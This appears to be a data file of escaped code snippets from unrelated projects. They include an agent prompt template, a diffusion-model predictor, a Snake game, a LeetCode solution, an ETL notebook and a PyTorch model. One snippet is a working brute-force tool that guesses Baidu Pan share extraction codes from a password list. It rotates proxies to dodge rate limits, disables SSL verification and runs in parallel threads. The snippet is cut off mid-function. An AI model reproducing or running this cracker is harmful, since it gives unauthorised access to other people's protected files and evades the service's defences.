\uff085\uff09\u4e0d\u8981\u5bf9\u8981\u7d20\u7684\u53d6\u503c/\u5b9a\u4e49\u505a\u4efb\u4f55\u5047\u8bbe\uff0c\u786e\u4fdd\u4f60\u7684\u4fe1\u606f\u6765\u81ea\u7ed9\u5b9a\u7684\u6570\u636e\u6e90\u3002\u4e0d\u8981\u7f16\u9020\u4fe1\u606f\u3002DO NOT MAKE UP ANY INFORMATION!!!\n  \uff086\uff09\u786e\u4fdd\u4f60\u6267\u884c\u7684\u52a8\u4f5c\u6d89\u53ca\u7684\u6240\u6709\u8981\u7d20\u90fd\u5df2\u83b7\u5f97\u786e\u5207\u7684\u53d6\u503c/\u5b9a\u4e49\u3002\n  \uff087\uff09\u5982\u679c\u5168\u90e8\u5b50\u4efb\u52a1\u5df2\u5b8c\u6210\uff0c\u8bf7\u7528FINISH\u52a8\u4f5c\u7ed3\u675f\u4efb\u52a1\u3002\n\"\"\"\n\n \n# ### \u9700\u8981\u52a8\u6001\u751f\u6210\u7684\u90e8\u4efd\n# #### \u4efb\u52a1\u63cf\u8ff0\n# `task_description`\u5e94\u5f53\u662f\u667a\u80fd\u4f53\u6bcf\u6b21\u6536\u5230\u7684\u4efb\u52a1\u76ee\u6807\uff0c\u5728\u8c03\u7528\u667a\u80fd\u4f53\u5faa\u73af\u601d\u8003\u548c\u884c\u52a8\u524d\u52a8\u6001\u586b\u5165\u3002\n# #### \u5de5\u4f5c\u76ee\u5f55\n# `work_dir`\u662f\u667a\u80fd\u4f53\u7684\u5de5\u4f5c\u6587\u4ef6\u5939\uff0c\u6240\u6709\u6570\u636e\u3001\u6587\u4ef6\u90fd\u4f1a\u653e\u5165\u8fd9\u4e2a\u4f4d\u7f6e\u3002\n # #### \u957f\u65f6\u8bb0\u5fc6\n# `long_term_memory`\u662f\u667a\u80fd\u4f53\u5b8c\u6210\u4e86\u4e00\u6b21\u4efb\u52a1\u4e4b\u540e\u7684\u6700\u7ec8\u8f93\u51fa\uff0c\u5e94\u5f53\u7531\u4ee3\u7801\u81ea\u52a8\u751f\u6210\u5e76\u4f5c\u4e3a\u53d8\u91cf\u52a8\u6001\u586b\u5165\u3002\n# #### \u77ed\u65f6\u8bb0\u5fc6\n# `short_term_memory`\u662f\u667a\u80fd\u4f53\u5728\u7ecf\u8fc7\u4e00\u6b21\u601d\u8003\u548c\u884c\u52a8\u540e\u4ea7\u751f\u7684\u8f93\u51fa\uff0c\u5e94\u5f53\u7531\u4ee3\u7801\u81ea\u52a8\u751f\u6210\u5e76\u4f5c\u4e3a\u53d8\u91cf\u52a8\u6001\u586b\u5165\u3002\n# #### \u5de5\u5177\u6e05\u5355\n# `tools`\u662f\u4e3a\u667a\u80fd\u4f53\u5b9a\u4e49\u7684Tool\u5217\u8868\uff0c\u5e94\u5f53\u7531\u4ee3\u7801\u81ea\u52a8\u751f\u6210\u5e76\u4f5c\u4e3a\u53d8\u91cf\u52a8\u6001\u586b\u5165\u3002\n# #### \u884c\u52a8\u9009\u62e9\n# `format_instructions`\u5bf9LLM\u63d0\u51fa\u8981\u6c42\uff1a\u6309\u7167\u9884\u5b9a\u4e49\u7684 Pydantic \u683c\u5f0f\u8981\u6c42\u751f\u6210\u3002\n\n\n# ### final_prompt\nfinal_prompt = PromptTemplate.from_template(\"\"\"\n\u4f60\u7684\u4efb\u52a1\u662f:\n{task_description}\n\n\u7ecf\u8fc7\u4ee5\u4e0b\u7684\u601d\u8003\u8fc7\u7a0b\uff0c\u4f60\u5df2\u7ecf\u5b8c\u6210\u4efb\u52a1:\n{short_term_memory}\n\n\u73b0\u5728\u8bf7\u8be6\u7ec6\u7ed9\u51fa\u4f60\u7684\u6700\u7ec8\u7b54\u6848:\n\"\"\")\n",
    "import os, sys\r\nfrom cog import BasePredictor, Input, Path\r\nsys.path.append('/content/MagicTime')\r\nos.chdir('/content/MagicTime')\r\n\r\nimport copy\r\nimport time\r\nimport torch\r\nimport random\r\nfrom glob import glob\r\nfrom omegaconf import OmegaConf\r\nfrom safetensors import safe_open\r\nfrom diffusers import AutoencoderKL\r\nfrom diffusers import DDIMScheduler\r\nfrom diffusers.utils.import_utils import is_xformers_available\r\nfrom transformers import CLIPTextModel, CLIPTokenizer\r\n\r\nfrom utils.unet import UNet3DConditionModel\r\nfrom utils.pipeline_magictime import MagicTimePipeline\r\nfrom utils.util import save_videos_grid, convert_ldm_unet_checkpoint, convert_ldm_clip_checkpoint, convert_ldm_vae_checkpoint, load_diffusers_lora_unet, convert_ldm_clip_text_model\r\n\r\npretrained_model_path   = \"./ckpts/Base_Model/stable-diffusion-v1-5\"\r\ninference_config_path   = \"./sample_configs/RealisticVision.yaml\"\r\nmagic_adapter_s_path    = \"./ckpts/Magic_Weights/magic_adapter_s/magic_adapter_s.ckpt\"\r\nmagic_adapter_t_path    = \"./ckpts/Magic_Weights/magic_adapter_t\"\r\nmagic_text_encoder_path = \"./ckpts/Magic_Weights/magic_text_encoder\"\r\n\r\ndevice = torch.device('cuda:0')\r\n\r\nclass MagicTimeController:\r\n    def __init__(self):\r\n        # config dirs\r\n        self.basedir                = os.getcwd()\r\n        self.stable_diffusion_dir   = os.path.join(self.basedir, \"ckpts\", \"Base_Model\")\r\n        self.motion_module_dir      = os.path.join(self.basedir, \"ckpts\", \"Base_Model\", \"motion_module\")\r\n        self.personalized_model_dir = os.path.join(self.basedir, \"ckpts\", \"DreamBooth\")\r\n        self.savedir                = os.path.join(self.basedir, \"outputs\")\r\n        os.makedirs(self.savedir, exist_ok=True)\r\n\r\n        self.dreambooth_list    = []\r\n        self.motion_module_list = []\r\n        \r\n        self.selected_dreambooth    = None\r\n        self.selected_motion_module = None\r\n        \r\n        self.refresh_motion_module()\r\n        self.refresh_personalized_model()\r\n        \r\n        # config models\r\n        self.inference_config      = OmegaConf.load(inference_config_path)[1]\r\n\r\n        self.tokenizer             = CLIPTokenizer.from_pretrained(pretrained_model_path, subfolder=\"tokenizer\")\r\n        self.text_encoder          = CLIPTextModel.from_pretrained(pretrained_model_path, subfolder=\"text_encoder\").to(device)\r\n        self.vae                   = AutoencoderKL.from_pretrained(pretrained_model_path, subfolder=\"vae\").to(device)\r\n        self.unet                  = UNet3DConditionModel.from_pretrained_2d(pretrained_model_path, subfolder=\"unet\", unet_additional_kwargs=OmegaConf.to_container(self.inference_config.unet_additional_kwargs)).to(device)\r\n        self.text_model            = CLIPTextModel.from_pretrained(\"openai/clip-vit-large-patch14\")\r\n        self.unet_model            = UNet3DConditionModel.from_pretrained_2d(pretrained_model_path, subfolder=\"unet\", unet_additional_kwargs=OmegaConf.to_container(self.inference_config.unet_additional_kwargs))\r\n\r\n        self.update_motion_module(self.motion_module_list[0])\r\n        self.update_motion_module_2(self.motion_module_list[0])\r\n        self.update_dreambooth(self.dreambooth_list[0])\r\n        \r\n    def refresh_motion_module(self):\r\n        motion_module_list = glob(os.path.join(self.motion_module_dir, \"*.ckpt\"))\r\n        self.motion_module_list = [os.path.basename(p) for p in motion_module_list]\r\n\r\n    def refresh_personalized_model(self):\r\n        dreambooth_list = glob(os.path.join(self.personalized_model_dir, \"*.safetensors\"))\r\n        self.dreambooth_list = [os.path.basename(p) for p in dreambooth_list]\r\n\r\n    def update_dreambooth(self, dreambooth_dropdown, motion_module_dropdown=None):\r\n        self.selected_dreambooth = dreambooth_dropdown\r\n        \r\n        dreambooth_dropdown = os.path.join(self.personalized_model_dir, dreambooth_dropdown)\r\n        dreambooth_state_dict = {}\r\n        with safe_open(dreambooth_dropdown, framework=\"pt\", device=\"cpu\") as f:\r\n            for key in f.keys(): dreambooth_state_dict[key] = f.get_tensor(key)\r\n                \r\n        converted_vae_checkpoint = convert_ldm_vae_checkpoint(dreambooth_state_dict, self.vae.config)\r\n        self.vae.load_state_dict(converted_vae_checkpoint)\r\n\r\n        del self.unet\r\n        self.unet = None\r\n        torch.cuda.empty_cache()\r\n        time.sleep(1)\r\n        converted_unet_checkpoint = convert_ldm_unet_checkpoint(dreambooth_state_dict, self.unet_model.config)\r\n        self.unet = copy.deepcopy(self.unet_model)\r\n        self.unet.load_state_dict(converted_unet_checkpoint, strict=False)\r\n\r\n        del self.text_encoder\r\n        self.text_encoder = None\r\n        torch.cuda.empty_cache()\r\n        time.sleep(1)\r\n        text_model = copy.deepcopy(self.text_model)\r\n        self.text_encoder = convert_ldm_clip_text_model(text_model, dreambooth_state_dict)\r\n\r\n        from swift import Swift\r\n        magic_adapter_s_state_dict = torch.load(magic_adapter_s_path, map_location=\"cpu\")\r\n        self.unet = load_diffusers_lo",
    "# Reference places\r\n## https://www.w3schools.com/python/\r\n\r\n#Constants\r\nidentityNumberCount = 3\r\nidentityStart = 0\r\nindenityend = 2\r\ntestValueNumberCount = 3\r\ntestValueStart = 3\r\ntestValueEnd = 5\r\n\r\n# Initiated Cached Datasources\r\nlistOfStudents = { }\r\nlistOfTests = { }\r\n\r\n###############################################################\r\n#  feedtToMemory\r\n#==============================================================\r\n#  Input: a single string\r\n#  Output: None\r\n#  Functionality:\r\n#   1) Create a starting index to maintain array integrity\r\n#   2) Split inputed String into an array seperated by a comma\r\n#   3) Create an emtpy Student ID Key and store it for \r\n#      studentInfo and TestInfo Datasources\r\n#   4) Create a temporary Repository For each Datasource\r\n#   5) Create a loop to feed in the first 3 values\r\n#   5a) First index will be the key / studentId to be used in \r\n#       creating multiple dictionary keys \r\n################################################################  \r\n# This function takes in a line and seperates it \r\n# into the two different datasources which is stored in memory\r\ndef feedToMemory(line):\r\n    #Functionality 1\r\n    index = 0\r\n    #Functionality 2\r\n    lineArray = line.split(\",\")\r\n    #Functionality 3\r\n    key = \"\"\r\n    # Functionality 4\r\n    tempStudentList = []\r\n    tempStudentTestList = []\r\n\r\n    #Functionality 5\r\n    ### currently index is starting at 0\r\n    while index < testValueStart + 1:\r\n        # Functionality 5a\r\n        if index == 0:\r\n            key = lineArray[index]\r\n            index = index + 1 \r\n        elif index == 1:\r\n            tempStudentList.append(lineArray[index])\r\n            index = index + 1\r\n            #listOfStudents[studentId][0] = lineArray[index]        \r\n        elif index == 2:\r\n            tempStudentList.append(lineArray[index])\r\n            index = index + 1\r\n            #listOfStudents[studentId][1] = lineArray[index]\r\n        elif index == 3:\r\n            tempStudentList.append(tempStudentList[0] + \"_\" + tempStudentList[1])          \r\n            listOfStudents[key] = tempStudentList \r\n            break\r\n\r\n    # index will be at 3 when it breaks from the first one\r\n    # so calculation  testValueNumberCount (3) - index(3)\r\n   \r\n    while index < testValueEnd + 1:\r\n        if index > indenityend and index < testValueEnd + 1:\r\n            tempStudentTestList.append(lineArray[index])\r\n        if index == testValueEnd:\r\n            listOfTests[key] = tempStudentTestList\r\n        index = index + 1\r\n\r\nstudentRecordCsvFile = open(\"section1-students.csv\", \"r\")\r\n\r\nwhile True:\r\n    # Read the lines of the file\r\n    text = studentRecordCsvFile.readline()\r\n    filteredText = text.replace(\"\\n\", \"\")\r\n    \r\n    if not text:\r\n        break\r\n    feedToMemory(filteredText)\r\nstudentRecordCsvFile.close()\r\n\r\nprint(listOfStudents)\r\n\r\n#ListOfStudents(ID,Name,test[List])\r\n#listOfStudents = { }\r\n#listOfStudents[\"abc123\"] = [\"Linda\",\"Smith\",\"linda_smith\"]\r\n#listOfStudents[\"abc124\"] = [\"Linda\",\"VanTucket\",\"linda_VanTucket\"]\r\n\r\n#ListOfTest(ID,test[])\r\n#listOfTests = { }\r\n#listOfTests[\"abc123\"] = [92,93,20]\r\n#listOfTests[\"abc124\"] = [20,35,25]\r\n\r\n#print(listOfTests[\"abc123\"][1])\r\n#print(listOfStudents[\"abc123\"][2])\r\n#print(listOfTests[\"abc124\"][1])\r\n#print(listOfStudents[\"abc124\"][2])\r\n\r\n# Read information from a csv file and put into memory\r\n\r\n\r\n# Process strings from the input\r\n# Create a multi-dimensional list of lists (an array)\r\n# Print information to the console\r\n# Print plots to the console\r\n# Create a text file as output \r\n# Use variables and sequence types\r\n# Use If Statements and loops\r\n# Use functions\r\n## \r\n\r\n\r\n\r\n",
    "import psutil\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n\n#Configura\u00e7\u00e3o do servidor de e-mail\nemail_sender = 'seu_email@exemplo.com.br'\nemail_password = 'minha_senha'\nemail_receiver = 'destino@exemplo.com.br'\n\n# Limites de alerta\nCPU_THRESHOLD = 85\nMEMORY_THRESHOLD = 85\nDISK_THRESHOLD = 85\n\ndef send_alert(message):\n   msg = MIMEMultipart()\n   msg['From']  = email_sender\n   msg['To'] = email_receiver\n   msg['Subject']  = 'Alerta de monitoramento do servidor'\n\n   msg.attach(MIMEText(message,'plain'))\n\n   try:\n     server = smtplib.SMTP('smtp.example.com', 587)\n     server.starttls()\n     server.login(email_sender,email_password)\n     text = msg.as_string()\n     server.sendmail(email_sender,email_receiver,text)\n     server.quit()\n     print(\"Alerta enviado com sucesso por e-mail\")\n   \n   except Exception as e:\n     print(f\"Falha ao enviar o alerta por email: {e}\")\n\ndef check_system():\n   cpu_usage = psutil.cpu_percent(interval=1)\n   memory = psutil.virtual_memory()\n   disk = psutil.disk_usage('/')\n   \n   messages = []\n   if cpu_usage > CPU_THRESHOLD:\n      messages.append(f\"Uso de cpu elevado: {cpu_usage}%\")\n   if memory.percent > MEMORY_THRESHOLD: \n      messages.append(f\"Uso de memoria elevado: {memory.percent}\")\n   if disk.percent > DISK_THRESHOLD:\n      messages.append(f\"Uso de disco elevado: {disk.percent}\")\n\n   if messages:\n      alert_message = \"\\n\".join(messages)\n      print(alert_message)\n      #send_alert(alert_message)\n   else:\n      print(\"Todos os parametros est\u00e3o ok\")\n\nif __name__ == \"__main__\":\n   check_system()\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "import pygame as pg\nimport pygame_menu as pgm\nfrom random import randrange, choice\npg.init()\nH = pg.display.Info().current_h\nW = pg.display.Info().current_w\nCLOCK = pg.time.Clock()\n\npg.display.set_mode((W//2,H//2), pg.RESIZABLE) \npg.display.set_caption(\"Snake\")\n\nlistColorName = [\"Azul\", \"Azul Oscuro\", \"Amarillo\", \"Blanco\", \"Celeste\", \"Colmena 1\", \"Colmena 2\", \"Colmena 3\", \"Gris\", \"Rosado\", \"Rojo\", \"Morado\", \"Negro\", \"Naranja\", \"Verde Oscuro\", \"Verde\"]\nlistColor = [\"#0079B0\", \"#003AB0\", \"#EBF41C\",\"#FFFFFF\", \"#00BEBF\", \"#F4BE2E\", \"#35AEDC\", \"#047732\", \"#808080\", \"#FF63A8\", \"#952121\", \"#7E228A\", \"#000000\", \"#FF8614\",\"#10BD3E\",\"#01DF3C\"]\nconfigColors = {\n    \"marco\": \"#FFFFFF\",\n    \"background\": \"#000000\",\n    \"head\": \"#10BD3E\",\n    \"body\": \"#01DF3C\",\n    \"head2\": \"#F4BE2E\",\n    \"body2\": \"#EBF41C\",\n    \"food\": \"#952121\",\n    \"ui\": \"#FFFFFF\",\n}\nconfigNumbers = {\n    \"dimention\": 25,\n    \"numManzanas\": 1,\n    \"longManzana\": 1,\n    \"speed\": 250,\n    \"multiSnake\": False,\n}\n\nclass Intro():\n    def __init__(self):\n        self.screen = pg.display.get_surface()\n        self.alpha = -5\n        self.imgLogo = pg.image.load(\"./images/logo.png\")\n        \n    def bucle(self, events:list):\n        global page\n        for event in events:\n            if event.type == pg.KEYDOWN: page = 1\n\n        self.screen.fill(\"#000000\")\n        width, height = self.screen.get_size()\n\n        imgLogo_copy = self.imgLogo.copy()\n        imgLogo_copy = pg.transform.scale(imgLogo_copy, (height,height))\n        imgSize = imgLogo_copy.get_size()\n        imgLogo_copy.set_alpha(self.alpha)\n        self.screen.blit(imgLogo_copy, ((width-imgSize[0])/2,0))\n        self.alpha += 1\n\n        if self.alpha > 155:\n            page = 1\n\nclass Start():\n    def __init__(self):\n        self.screen = pg.display.get_surface()\n        self.multi = False\n        sound = pgm.sound.Sound()\n        sound.load_example_sounds()\n        self.imgWin = pg.image.load(\"./images/win.png\")\n\n        mytheme = pgm.Theme()\n        mytheme.title_bar_style = pgm.widgets.MENUBAR_STYLE_SIMPLE\n        mytheme.widget_font_color = \"#70888C\"\n        mytheme.selection_color = \"#6E2A48\"\n        mytheme.background_color = \"#DAEBEE\"\n        mytheme.title_font_color = \"#DAEBEE\"\n        mytheme.title_background_color = \"#6E2A48\"\n\n        screenW, screenH = self.screen.get_size()\n        self.menuColors = pgm.pygame_menu.Menu('Colores', screenW, screenH,theme=mytheme, center_content=True)\n        self.menuColors.set_sound(sound, False)\n        def changeColor(*args, **kwargs):\n            configColors.update({kwargs[\"kwargs\"]: listColor[args[0][1]]})\n        self.menuColors.add.dropselect('Marco = ', items=[(i, \"\") for i in listColorName], default=listColor.index(configColors[\"marco\"]) ,onchange=changeColor, kwargs=\"marco\", font_color=\"#375D64\")\n        self.menuColors.add.dropselect('Texto = ', items=[(i, \"\") for i in listColorName], default=listColor.index(configColors[\"ui\"]) ,onchange=changeColor, kwargs=\"ui\", font_color=\"#56929D\")\n        self.menuColors.add.dropselect('Fondo = ', items=[(i, \"\") for i in listColorName], default=listColor.index(configColors[\"background\"]) ,onchange=changeColor, kwargs=\"background\", font_color=\"#375D64\")\n        self.menuColors.add.dropselect('Comida = ', items=[(i, \"\") for i in listColorName], default=listColor.index(configColors[\"food\"]) ,onchange=changeColor, kwargs=\"food\", font_color=\"#56929D\")\n        self.menuColors.add.vertical_margin(10)\n        self.menuColors.add.label(\"Jugador\")\n        self.menuColors.add.dropselect('Cabeza = ', items=[(i, \"\") for i in listColorName], default=listColor.index(configColors[\"head\"]) ,onchange=changeColor, kwargs=\"head\", font_color=\"#375D64\")\n        self.menuColors.add.dropselect('Cuerpo = ', items=[(i, \"\") for i in listColorName], default=listColor.index(configColors[\"body\"]) ,onchange=changeColor, kwargs=\"body\", font_color=\"#56929D\")\n\n        self.menuNumber = pgm.pygame_menu.Menu('Parametros de juego', screenW, screenH,theme=mytheme, center_content=True)\n        self.menuNumber.set_sound(sound, False)\n        def changeNumber(*args, **kwargs):\n            if (num := args[0]) < 2: num = 2\n            configNumbers.update({kwargs[\"kwargs\"]: num})\n        def changeSpeed(*args, **kwargs):\n            if (num := args[0]) < 1: num = 1\n            num = 1000-num*10\n            if (args[0]) == 99: num = 1\n            configNumbers.update({\"speed\": num})\n\n        self.menuNumber.add.text_input('Tama\u00f1o del tablero = ', default=str(configNumbers[\"dimention\"]), input_type=pgm.locals.INPUT_INT, maxchar=3, onchange=changeNumber, kwargs=\"dimention\", font_color=\"#375D64\")\n        self.menuNumber.add.text_input('Cantidad de comida en pantalla = ', default=str(configNumbers[\"numManzanas\"]), input_type=pgm.locals.INPUT_INT, maxchar=3, onchange=changeNumber, kwargs=\"numManzanas\", font_color=\"#56929D\")\n        self.menuNumber.add.text_input('Aumento por comida = ', default=str(configNumbers[\"longManzana\"]), input_type=pgm.locals.I",
    "import http.cookiejar\nimport os\nimport random\nimport ssl\nimport threading\nimport time\nimport urllib.parse\nimport urllib.request\nfrom concurrent.futures import ThreadPoolExecutor\nfrom datetime import datetime\n\nfrom loguru import logger as log\n\nssl._create_default_https_context = ssl._create_unverified_context\n\npassword = \"\"\npwd_pool = []\nproxy_pool = {}\n\ntotal_pwd_cnt = 0\n\nproxy_record = {}\nthread_process_cnt = {}\n\n# example: \"surl=xxxx\"\nurl_suffix = \"\"\n\ndelay = 2000\nthread_cnt = 10\n\ncurrent_date = datetime.now().strftime(\"%Y-%m-%d\")\n\nverify_headers = {\n    \"Accept-Language\": \"zh-CN,zh;q=0.9,en;q=0.8\",\n    \"Accept\": \"application/json, text/javascript, */*; q=0.01\",\n    \"Content-Length\": \"26\",\n    \"Host\": \"pan.baidu.com\",\n    \"Origin\": \"https://pan.baidu.com\",\n    \"Referer\": \"https://pan.baidu.com/share/init?\" + url_suffix,\n    \"Connection\": \"keep-alive\",\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36\",\n    \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\",\n    \"X-Requested-With\": \"XMLHttpRequest\"\n}\n\n\ndef load_pwd_pool():\n    \"\"\"\n    Load a dictionary from a file and return it as a list.\n\n    :param pwd_pool_file: The file path to the password pool file.\n    :return: A list containing the passwords from the file.\n    \"\"\"\n\n    wrong_pwds = set()\n    global pwd_pool\n    if not os.path.exists(\"wrong_pwds.txt\"):\n        with open(\"wrong_pwds.txt\", \"w\") as fp:\n            pass\n\n    with open(\"wrong_pwds.txt\", \"r\") as fp:\n        for line in fp:\n            wrong_pwds.add(line.strip('\\n'))\n\n    if not os.path.exists(\"merged_pwd_pool.txt\"):\n        with open(\"pwd_pool.txt\", \"r\") as fp:\n            pwd_pool = set(line.strip('\\n') for line in fp)\n        pwd_pool = pwd_pool - wrong_pwds\n    else:\n        with open(\"merged_pwd_pool.txt\", \"r\") as fp:\n            pwd_pool = set(line.strip('\\n') for line in fp)\n        pwd_pool = pwd_pool - wrong_pwds\n\n    # merge pwd pool\n    with open(\"merged_pwd_pool.txt\", \"w\") as fp:\n        for pwd in pwd_pool:\n            fp.write(pwd + '\\n')\n\n    # clear wrong pwds\n    with open(\"wrong_pwds.txt\", \"w\") as fp:\n        pass\n\n    pwd_pool = list(pwd_pool)\n\n\ndef load_proxy_pool():\n    \"\"\"\n    Load a proxy pool from a file.\n    \"\"\"\n\n    global proxy_pool\n    with open(\"proxy_pool.txt\", \"r\") as fp:\n        for line in fp:\n            proxy = line.strip('\\n')\n            proxy_pool[proxy] = 0\n\n\ndef change_proxy() -> dict:\n    proxy = {'https': ''}\n    if not proxy_pool:\n        return proxy\n\n    # get the least used proxy\n    least_used_proxy = min(proxy_pool, key=proxy_pool.get)\n    proxy_pool[least_used_proxy] += 1\n    proxy['https'] = least_used_proxy\n    proxy['http'] = least_used_proxy\n\n    return proxy\n\n\ndef get_opener(thread_name, new_cookie=False) -> urllib.request.build_opener:\n    need_change_proxy = True\n    while need_change_proxy:\n        proxy = change_proxy()\n        proxy_record[proxy['https']] = proxy_record.get(proxy['https'], 0) + 1\n        cookie = http.cookiejar.MozillaCookieJar(\"cookie.txt\")\n        handler = urllib.request.HTTPCookieProcessor(cookie)\n        opener = urllib.request.build_opener(handler, urllib.request.ProxyHandler(proxy)) if proxy[\n            'https'] else urllib.request.build_opener(handler)\n\n        if not new_cookie:\n            return opener\n\n        try:\n            request = urllib.request.Request(\"https://pan.baidu.com/share/init?\" + url_suffix)\n            opener.open(request, timeout=30)\n\n            log.info(\"[{}]: [{}] request cookie success\", thread_name, proxy['https'])\n            return opener\n        except Exception as e:\n            log.warning(\"[{}]: [{}] request cookie error: {}\", thread_name, proxy['https'], str(e))\n            proxy['https'] = ''\n            proxy['http'] = ''\n            time.sleep(1)\n            need_change_proxy = True\n            continue\n\n\ndef verify(thread_name, opener, trying_pwd) -> int:\n    try:\n        post_url = \"https://pan.baidu.com/share/verify?\" + url_suffix + \"&t=\" + str(round(\n            time.time() * 1000)) + \"&bdstoken=null&channel=chunlei&web=1&app_id=250528&25a0b16af06504103a0f9f97309f9b68&logid=MTUxOTgxMzU1MDIyMTAuMzUzMDQ1NDMwMTM5NjUyOTU=&clienttype=0\"\n        data = {\"pwd\": trying_pwd, \"vcode\": \"\", \"vcode_str\": \"\"}\n        request = urllib.request.Request(post_url, headers=verify_headers, data=urllib.parse.urlencode(data).encode())\n        response = opener.open(request, timeout=30)\n        check = response.read().decode()\n        if check.find(r'\"errno\":-9') != -1:\n            with open(\"wrong_pwds.txt\", \"a\") as fp:\n                if fp.tell() != 0:\n                    fp.write(\"\\n\")\n                fp.write(trying_pwd)\n                log.info(\"[{}]: wrong password: {}\", thread_name, trying_pwd)\n            return -1\n        elif check.find(r'\"errno\":0') != -1:\n            global password\n            password = trying_pwd\n            log.info(\"[{}]: proxy: right password: {}\", threa",
    "# 2. Add Two Numbers\n# You are given two non-empty linked lists representing two non-negative integers. The digits are stored in reverse order, and each of their nodes contains a single digit. Add the two numbers and return the sum as a linked list.\n\n# You may assume the two numbers do not contain any leading zero, except the number 0 itself.\n\n# Example 1:\n\n\n# Input: l1 = [2,4,3], l2 = [5,6,4]\n# Output: [7,0,8]\n# Explanation: 342 + 465 = 807.\n# Example 2:\n\n# Input: l1 = [0], l2 = [0]\n# Output: [0]\n# Example 3:\n\n# Input: l1 = [9,9,9,9,9,9,9], l2 = [9,9,9,9]\n# Output: [8,9,9,9,0,0,0,1]\n \n\n# Constraints:\n\n# The number of nodes in each linked list is in the range [1, 100].\n# 0 <= Node.val <= 9\n# It is guaranteed that the list represents a number that does not have leading zeros.\n\n#########################################################################################################################\n# Definition for singly-linked list.\nclass ListNode(object):\n    def __init__(self, val=0, next=None):\n        self.val = val\n        self.next = next\n\n####################################\nclass Solution(object):\n    def addTwoNumbers(self, l1, l2):\n        \"\"\"\n        :type l1: ListNode\n        :type l2: ListNode\n        :rtype: ListNode\n        \"\"\"\n        \n        #First Attempt:\n        cl = l1\n        txt1 = \"\"\n        txt2 = \"\"\n        while cl:\n            txt1=str(cl.val) + txt1\n            cl = cl.next\n        cl =l2\n        while cl:\n            txt2=str(cl.val) +txt2\n            cl = cl.next\n        leng = max(len(txt1),len(txt2))\n\n        txt1=txt1.rjust(leng,\"0\")\n        txt2=txt2.rjust(leng,\"0\")\n        val = str(int(txt1) + int (txt2))\n\n        res = None\n        for i in val:\n            res = ListNode(int(i),res)\n        return res\n    \n        #Accepted:\n        #Runtime \u2248 49ms\n        #Memory \u2248 11.80mb\n    \n",
    "#!/usr/bin/env python\n# coding: utf-8\n\n# In[76]:\n\n\n#import libraries\n#!pip install kaggle\nimport kaggle\n\n!kaggle datasets download ankitbansal06/retail-orders -f orders.csv\n\n\n# In[77]:\n\n\n#extract file from zip file\nimport zipfile\nzip_ref = zipfile.ZipFile('orders.csv.zip') \nzip_ref.extractall() # extract file to dir\nzip_ref.close() # close file\n\n\n# In[145]:\n\n\n#read data from the file and handle null values\nimport pandas as pd\ndf = pd.read_csv('orders.csv',na_values=['Not Available','unknown'])\ndf['Ship Mode'].unique()\n\n\n# In[154]:\n\n\n#rename columns names ..make them lower case and replace space with underscore\n#df.rename(columns={'Order Id':'order_id', 'City':'city'})\n#df.columns=df.columns.str.lower()\n#df.columns=df.columns.str.replace(' ','_')\ndf.head(5)\n\n\n# In[159]:\n\n\n#derive new columns discount , sale price and profit\n#df['discount']=df['list_price']*df['discount_percent']*.01\n#df['sale_price']= df['list_price']-df['discount']\ndf['profit']=df['sale_price']-df['cost_price']\ndf\n\n\n# In[162]:\n\n\n#convert order date from object data type to datetime\ndf['order_date']=pd.to_datetime(df['order_date'],format=\"%Y-%m-%d\")\n\n\n# In[167]:\n\n\n#drop cost price list price and discount percent columns\ndf.drop(columns=['list_price','cost_price','discount_percent'],inplace=True)\n\n\n# In[169]:\n\n\n#load the data into sql server using replace option\nimport sqlalchemy as sal\nengine = sal.create_engine('mssql://ANKIT\\SQLEXPRESS/master?driver=ODBC+DRIVER+17+FOR+SQL+SERVER')\nconn=engine.connect()\n\n\n# In[172]:\n\n\n#load the data into sql server using append option\ndf.to_sql('df_orders', con=conn , index=False, if_exists = 'append')\n\n\n",
    "import torch.nn.functional as F\nimport torch.nn as nn\nimport torch\n\n\nclass ConvLea(nn.Module):\n    \"\"\"(convolution => LeakyReLU) * 2\"\"\"\n\n    def __init__(self, in_channels, out_channels, mid_channels=None):\n        super().__init__()\n        if not mid_channels:\n            mid_channels = out_channels\n        self.double_conv = nn.Sequential(\n            nn.Conv2d(in_channels, out_channels, kernel_size=3, padding=1, padding_mode='replicate'),\n            nn.LeakyReLU(),\n        )\n\n    def forward(self, x):\n        return self.double_conv(x)\n\n\nclass ConvLea1(nn.Module):\n    \"\"\"(convolution => LeakyReLU) * 2\"\"\"\n\n    def __init__(self, in_channels, out_channels, mid_channels=None):\n        super().__init__()\n        if not mid_channels:\n            mid_channels = out_channels\n        self.double_conv = nn.Sequential(\n            nn.Conv2d(in_channels, out_channels, kernel_size=1),\n            nn.Tanh(),\n        )\n\n    def forward(self, x):\n        return self.double_conv(x)\n\n\nclass Convtanh(nn.Module):\n    \"\"\"(convolution => Tanh) * 2\"\"\"\n\n    def __init__(self, in_channels, out_channels, mid_channels=None):\n        super().__init__()\n        if not mid_channels:\n            mid_channels = out_channels\n        self.double_conv = nn.Sequential(\n            nn.Conv2d(in_channels, out_channels, kernel_size=3, padding=1, padding_mode='replicate'),\n            nn.Tanh(),\n        )\n\n    def forward(self, x):\n        return self.double_conv(x)\n\n\ndef Concat(x, y, z):\n    return torch.cat((x, y), z)\n\nclass wtNet(nn.Module):\n    def __init__(self, n_channels, n_classes, bilinear=True, pthfile = 'your file'):\n        super(wtNet, self).__init__()\n         \n        # net= UNet(n_channels=1, n_classes=1, bilinear=True)\n        \n        self.n_channels = n_channels\n        self.n_classes = n_classes\n        self.bilinear = bilinear \n\n        self.xin1 = ConvLea(n_channels, 32)\n        self.xin2 = ConvLea(32, 64)\n        self.wei_xin = ConvLea1(64, 1)\n\n\n        self.fon33 = ConvLea(128, 64)\n        self.fon44 = Convtanh(64, 1)\n\n        if pthfile is not None:\n            # self.load_state_dict(torch.save(torch.load(pthfile), pthfile,_use_new_zipfile_serialization=False), strict = False)  # \u8bad\u7ec3\u6240\u6709\u6570\u636e\u540e\uff0c\u4fdd\u5b58\u7f51\u7edc\u7684\u53c2\u6570\n            self.load_state_dict(torch.load(pthfile), strict = False)\n        \n\n\n    def forward(self, x, y):\n        \n        v1 = self.xin1(x) #32\n        v2 = self.xin2(v1) #64\n\n\n        r1 = self.xin1(y)\n        r2 